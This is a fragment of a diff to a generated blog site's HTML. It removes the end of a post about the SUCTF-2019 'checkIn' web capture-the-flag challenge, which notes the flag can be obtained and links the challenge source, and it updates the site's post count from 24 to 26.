-<p>也可以得到flag</p>
-<p>题目提供了源码：<br><a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1858,7 +1859,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-count">26</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
